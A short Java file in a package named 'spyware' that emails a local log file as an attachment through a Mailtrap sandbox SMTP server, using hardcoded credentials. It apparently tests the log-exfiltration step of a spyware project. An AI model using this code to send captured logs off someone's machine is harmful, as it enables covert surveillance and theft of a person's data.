package spyware;

import java.io.File;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class EmailTeste {

    public static void main(String[] args) {
        // Configuração das propriedades do MailTrap
        Properties properties = new Properties();
        properties.put("mail.smtp.host", "sandbox.smtp.mailtrap.io");
        properties.put("mail.smtp.port", "2525");
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.ssl.protocols", "TLSv1.2");

        // Autenticação
        final String username = "47d47a8d8b9baf";
        final String password = "bc64dc52a88f49";

        Session session = Session.getInstance(properties, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        try {
            // Criando a mensagem de e-mail
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("from@example.com"));
            message.setRecipients(
                Message.RecipientType.TO, InternetAddress.parse("to@example.com")
            );
            message.setSubject("Teste de E-mail");

            // Corpo do e-mail
            MimeBodyPart messageBodyPart = new MimeBodyPart();
            messageBodyPart.setText("Este é um e-mail de teste enviado pelo MailTrap!");

            // Anexando o arquivo ao e-mail
            MimeBodyPart attachmentPart = new MimeBodyPart();
            String filePath = "C:\\Users\\User\\Documents\\logs\\log-2024-05-27.txt";// Substitua pelo caminho do seu arquivo
            File file = new File(filePath);
            DataSource source = new FileDataSource(file);
            attachmentPart.setDataHandler(new DataHandler(source));
            attachmentPart.setFileName(file.getName());

            // Criando a parte do e-mail com o arquivo anexado
            MimeMultipart multipart = new MimeMultipart();
            multipart.addBodyPart(messageBodyPart);
            multipart.addBodyPart(attachmentPart);

            // Configurando a mensagem com as partes
            message.setContent(multipart);

            // Enviando a mensagem
            Transport.send(message);

            System.out.println("E-mail enviado com sucesso!");

        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }
}
